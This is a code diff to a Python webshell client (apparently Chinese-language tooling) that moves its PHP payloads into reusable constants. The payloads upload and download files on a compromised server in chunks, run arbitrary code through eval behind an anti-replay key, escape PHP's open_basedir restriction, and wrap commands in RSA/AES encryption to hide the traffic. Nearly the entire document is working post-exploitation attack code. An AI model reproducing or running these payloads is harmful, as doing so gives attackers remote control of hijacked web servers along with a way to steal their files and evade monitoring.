@@ -1,5 +1,6 @@
 """PHP Session的实现"""
 
+import re
 import asyncio
 import base64
 import json
@@ -151,6 +152,66 @@ if(!file_exists($filePath)) {
 }
 """
 
+UPLOAD_FILE_CHUNK_PHP = """
+$file = tempnam("", "");
+$content = base64_decode('BASE64_CONTENT');
+file_put_contents($file, $content);
+decoder_echo($file);
+"""
+
+UPLOAD_FILE_MERGE_PHP = """
+$files = json_decode(FILES);
+$content = "";
+$readerror = false;
+foreach($files as &$file) {
+    if(!file_exists($file)) {
+        $readerror = true;
+    }
+    if(!$readerror) {
+        $content = $content . file_get_contents($file);
+    }
+    @unlink($file);
+}
+if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
+    decoder_echo("WRONG_NO_PERMISSION");
+}
+else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
+    decoder_echo("WRONG_NO_PERMISSION_DIR");
+}
+else if($readerror) {
+    decoder_echo("WRONG_READ_ERROR");
+}else{
+    file_put_contents(FILENAME, $content);
+    decoder_echo("DONE");
+}
+"""
+
+DOWNLOAD_FILE_FILESIZE_PHP = """
+if(!is_file(FILEPATH)) {
+    decoder_echo("WRONG_NOT_FILE");
+} else if(!is_readable(FILEPATH)) {
+    decoder_echo("WRONG_NO_PERMISSION");
+} else {
+    decoder_echo(json_encode(filesize(FILEPATH)));
+}
+"""
+
+DOWNLOAD_FILE_CHUNK_PHP = """
+$file = fopen(FILEPATH, "rb");
+if(!is_file(FILEPATH)) {
+    decoder_echo("WRONG_NOT_FILE");
+} else if(!is_readable(FILEPATH)) {
+    decoder_echo("WRONG_NO_PERMISSION");
+} else if(!$file) {
+    decoder_echo("WRONG_UNKNOWN");
+}else{
+    fseek($file, OFFSET);
+    $content = fread($file, CHUNK_SIZE);
+    fclose($file);
+    decoder_echo(base64_encode($content));
+}
+"""
+
 GET_BASIC_INFO_PHP = """
 $infos = array();
 array_push($infos, [
@@ -258,6 +319,101 @@ if(!$_SESSION['PAYLOAD_STORE']) {
 unset($_SESSION['PAYLOAD_STORE']);
 """
 
+ANTIREPLAY_GENKEY_PHP = """
+decoder_echo(($_SESSION['SESSION_NAME']=rand()%10000).'');
+"""
+
+ANTIREPLAY_VERIFY_PHP = """
+if(KEY == $_SESSION[SESSION_NAME]) {
+    eval(base64_decode(PAYLOAD_B64));
+    unset($_SESSION[SESSION_NAME]);
+}else{
+    decoder_echo("WRONG_BAD_KEY");
+}
+"""
+
+BYPASS_OPEN_BASEDIR_PHP = """
+function bypass_open_basedir()
+{
+    $basedir = @ini_get("open_basedir");
+    if (!$basedir) {
+        return;
+    }
+    $basedir_arr = preg_split("/;|:/", $basedir);
+    $pwd = @dirname($_SERVER["SCRIPT_FILENAME"]);
+    @array_push($basedir_arr, $pwd, sys_get_temp_dir());
+    foreach ($basedir_arr as $item) {
+        if (!@is_writable($item)) {
+            continue;
+        }
+        $tmdir = $item . "/." . (rand() % 100000);
+        if (!(@mkdir($tmdir)) || !@file_exists($tmdir)) {
+            continue;
+        }
+        $tmdir = realpath($tmdir);
+        @chdir($tmdir);
+        @ini_set("open_basedir", "..");
+        $cntarr = @preg_split("/\\\\\\\\|\\//", $tmdir);
+        for ($i = 0; $i < sizeof($cntarr); $i++) {
+            @chdir("..");
+        }
+        @ini_set("open_basedir", "/");
+        @rmdir($tmdir);
+        break;
+    }
+}
+bypass_open_basedir();
+PAYLOAD
+"""
+
+ENCRYPTION_SENDKEY_PHP = """
+if(extension_loaded('openssl')) {
+    $_SESSION[SESSION_NAME] = openssl_random_pseudo_bytes(32);
+    openssl_public_encrypt(
+        $_SESSION[SESSION_NAME],
+        $encrypted,
+        base64_decode(PUBKEY_B64),
+        OPENSSL_PKCS1_OAEP_PADDING
+    );
+    decoder_echo(base64_encode($encrypted));
+}else{
+    decoder_echo("WRONG_NO_OPENSSL");
+}
+"""
+
+ENCRYPTION_COMMUNICATE_PHP = """
+function aes_enc($data) {
+    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
+    $encryptedData = openssl_encrypt(
+        $data,
+        'AES-256-CBC',
+        $_SESSION[SESSION_NAME],
+        0,
+        $iv
+    );
+    return base64_encode($iv . base64_decode($encryptedData));
+}
+
+function aes_dec($encryptedData) {
+    $data = base64_decode($encryptedData);
+    return openssl_decrypt(
+        base64_encode(substr($data, 16)),
+        'aes-256-cbc',
+        $_SESSION[SESSION_NAME],
+        0,
+        substr($data, 0, 16)
+    );
+    unset($_SESSION[SESSION_NAME]);
+}
+if(extension_loaded('openssl')) {
+    array_push($decoder_hooks, "aes_enc");
+    $code = aes_dec(CODE_ENC);
+    eval($code);
+}else{
+    decoder_echo("WRONG_NO_OPENSSL");
+}
+"""
+
 PAYLOAD_SESSIONIZE_CHUNK = 1024
 
 __all__ = [
@@ -286,6 +442,10 @@ def base64_encode(s):
     if isinstance(s, str):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
+
+
+def compress_phpcode_template(s):
+    return re.sub(r"\n +", " ", s, re.M)
 
 
 def to_sessionize_payload(
@@ -495,16 +655,7 @@ class PHPWebshell(PHPSessionInterface):
 
         async def upload_chunk(chunk: bytes):
             nonlocal done_count
-            code = """
-            $file = tempnam("", "");
-            $content = base64_decode('BASE64_CONTENT');
-            file_put_contents($file, $content);
-            decoder_echo($file);
-            """.replace(
-                "    ", ""
-            ).replace(
-                "BASE64_CONTENT", base64_encode(chunk)
-            )
+            code = UPLOAD_FILE_CHUNK_PHP.replace("BASE64_CONTENT", base64_encode(chunk))
             async with sem:
                 await asyncio.sleep(0.01)  # we don't ddos
                 result = await self.submit(code)
@@ -518,37 +669,9 @@ class PHPWebshell(PHPSessionInterface):
             for i in range(0, len(content), chunk_size)
         ]
         uploaded_chunks = await asyncio.gather(*coros)
-        code = """
-        $files = json_decode(FILES);
-        $content = "";
-        $readerror = false;
-        foreach($files as &$file) {
-            if(!file_exists($file)) {
-                $readerror = true;
-            }
-            if(!$readerror) {
-                $content = $content . file_get_contents($file);
-            }
-            @unlink($file);
-        }
-        if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
-            decoder_echo("WRONG_NO_PERMISSION");
-        }
-        else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
-            decoder_echo("WRONG_NO_PERMISSION_DIR");
-        }
-        else if($readerror) {
-            decoder_echo("WRONG_READ_ERROR");
-        }else{
-            file_put_contents(FILENAME, $content);
-            decoder_echo("DONE");
-        }
-
-        """.replace(
+        code = UPLOAD_FILE_MERGE_PHP.replace(
             "FILES", repr(json.dumps(uploaded_chunks))
-        ).replace(
-            "FILENAME", repr(filepath)
-        )
+        ).replace("FILENAME", repr(filepath))
         result = await self.submit(code)
         if result == "WRONG_NO_PERMISSION":
             raise exceptions.FileError("没有权限写入这个文件")
@@ -563,17 +686,7 @@ class PHPWebshell(PHPSessionInterface):
     ) -> bytes:
 
         filesize_text = await self.submit(
-            """
-            if(!is_file(FILEPATH)) {
-                decoder_echo("WRONG_NOT_FILE");
-            } else if(!is_readable(FILEPATH)) {
-                decoder_echo("WRONG_NO_PERMISSION");
-            } else {
-                decoder_echo(json_encode(filesize(FILEPATH)));
-            }
-            """.replace(
-                "FILEPATH", repr(filepath)
-            )
+            DOWNLOAD_FILE_FILESIZE_PHP.replace("FILEPATH", repr(filepath))
         )
         if filesize_text == "WRONG_NOT_FILE":
             raise exceptions.FileError("没有这个文件")
@@ -604,25 +717,7 @@ class PHPWebshell(PHPSessionInterface):
         async def download_chunk(offset: int):
             nonlocal done_count, coros
             code = (
-                """
-            $file = fopen(FILEPATH, "rb");
-            if(!is_file(FILEPATH)) {
-                decoder_echo("WRONG_NOT_FILE");
-            } else if(!is_readable(FILEPATH)) {
-                decoder_echo("WRONG_NO_PERMISSION");
-            } else if(!$file) {
-                decoder_echo("WRONG_UNKNOWN");
-            }else{
-                fseek($file, OFFSET);
-                $content = fread($file, CHUNK_SIZE);
-                fclose($file);
-                decoder_echo(base64_encode($content));
-            }
-
-            """.replace(
-                    "    ", ""
-                )
-                .replace("FILEPATH", repr(filepath))
+                DOWNLOAD_FILE_CHUNK_PHP.replace("FILEPATH", repr(filepath))
                 .replace("OFFSET", str(offset))
                 .replace("CHUNK_SIZE", str(chunk_size))
             )
@@ -721,7 +816,7 @@ class PHPWebshell(PHPSessionInterface):
         async def wrap(payload: str) -> str:
             session_name = f"replay_key_{uuid.uuid4()}"
             key = await submitter(
-                f"decoder_echo(($_SESSION[{session_name!r}]=rand()%10000).'');"
+                ANTIREPLAY_GENKEY_PHP.replace("SESSION_NAME", session_name)
             )
             try:
                 key = int(key)
@@ -731,16 +826,7 @@ class PHPWebshell(PHPSessionInterface):
                 ) from exc
             payload_b64 = base64_encode(payload)
             code = (
-                """
-            if(KEY == $_SESSION[SESSION_NAME]) {
-                eval(base64_decode(PAYLOAD_B64));
-                unset($_SESSION[SESSION_NAME]);
-            }else{
-                decoder_echo("WRONG_BAD_KEY");
-            }
-            """.replace(
-                    "SESSION_NAME", repr(session_name)
-                )
+                ANTIREPLAY_VERIFY_PHP.replace("SESSION_NAME", repr(session_name))
                 .replace("KEY", repr(key))
                 .replace("PAYLOAD_B64", repr(payload_b64))
                 .strip()
@@ -758,45 +844,7 @@ class PHPWebshell(PHPSessionInterface):
     ) -> t.Callable[[str], t.Awaitable[str]]:
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
-            return await submitter(
-                """
-            function bypass_open_basedir()
-            {
-                $basedir = @ini_get("open_basedir");
-                if (!$basedir) {
-                    return;
-                }
-                $basedir_arr = preg_split("/;|:/", $basedir);
-                $pwd = @dirname($_SERVER["SCRIPT_FILENAME"]);
-                @array_push($basedir_arr, $pwd, sys_get_temp_dir());
-                foreach ($basedir_arr as $item) {
-                    if (!@is_writable($item)) {
-                        continue;
-                    }
-                    $tmdir = $item . "/." . (rand() % 100000);
-                    if (!(@mkdir($tmdir)) || !@file_exists($tmdir)) {
-                        continue;
-                    }
-                    $tmdir = realpath($tmdir);
-                    @chdir($tmdir);
-                    @ini_set("open_basedir", "..");
-                    $cntarr = @preg_split("/\\\\\\\\|\\//", $tmdir);
-                    for ($i = 0; $i < sizeof($cntarr); $i++) {
-                        @chdir("..");
-                    }
-                    @ini_set("open_basedir", "/");
-                    @rmdir($tmdir);
-                    break;
-                }
-            }
-            bypass_open_basedir();
-            PAYLOAD
-            """.replace(
-                    "    ", ""
-                ).replace(
-                    "PAYLOAD", payload
-                )
-            )
+            return await submitter(BYPASS_OPEN_BASEDIR_PHP.replace("PAYLOAD", payload))
 
         return wrap
 
@@ -810,20 +858,7 @@ class PHPWebshell(PHPSessionInterface):
             payload = f"eval(base64_decode({base64_encode(payload)!r}));"
             session_name = f"rsa_key_{uuid.uuid4()}"
             key_encrypted = await submitter(
-                """
-                if(extension_loaded('openssl')) {
-                    $_SESSION[SESSION_NAME] = openssl_random_pseudo_bytes(32);
-                    openssl_public_encrypt(
-                        $_SESSION[SESSION_NAME],
-                        $encrypted,
-                        base64_decode(PUBKEY_B64),
-                        OPENSSL_PKCS1_OAEP_PADDING
-                    );
-                    decoder_echo(base64_encode($encrypted));
-                }else{
-                    decoder_echo("WRONG_NO_OPENSSL");
-                }
-            """.replace(
+                ENCRYPTION_SENDKEY_PHP.replace(
                     "PUBKEY_B64", repr(base64_encode(pubkey))
                 )
                 .replace("SESSION_NAME", repr(session_name))
@@ -841,41 +876,7 @@ class PHPWebshell(PHPSessionInterface):
             payload_enc = encrypt_aes256_cbc(key, payload.encode("utf-8"))
 
             result_enc = await submitter(
-                """
-                function aes_enc($data) {
-                    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('AES-256-CBC'));
-                    $encryptedData = openssl_encrypt(
-                        $data,
-                        'AES-256-CBC',
-                        $_SESSION[SESSION_NAME],
-                        0,
-                        $iv
-                    );
-                    return base64_encode($iv . base64_decode($encryptedData));
-                }
-
-                function aes_dec($encryptedData) {
-                    $data = base64_decode($encryptedData);
-                    return openssl_decrypt(
-                        base64_encode(substr($data, 16)),
-                        'aes-256-cbc',
-                        $_SESSION[SESSION_NAME],
-                        0,
-                        substr($data, 0, 16)
-                    );
-                    unset($_SESSION[SESSION_NAME]);
-                }
-                if(extension_loaded('openssl')) {
-                    array_push($decoder_hooks, "aes_enc");
-                    $code = aes_dec(CODE_ENC);
-                    eval($code);
-                }else{
-                    decoder_echo("WRONG_NO_OPENSSL");
-                }
-
-                """.replace(
-                    "SESSION_NAME", repr(session_name)
-                )
+                ENCRYPTION_COMMUNICATE_PHP.replace("SESSION_NAME", repr(session_name))
                 .replace("CODE_ENC", repr(base64_encode(payload_enc)))
                 .replace("    ", "")
             )
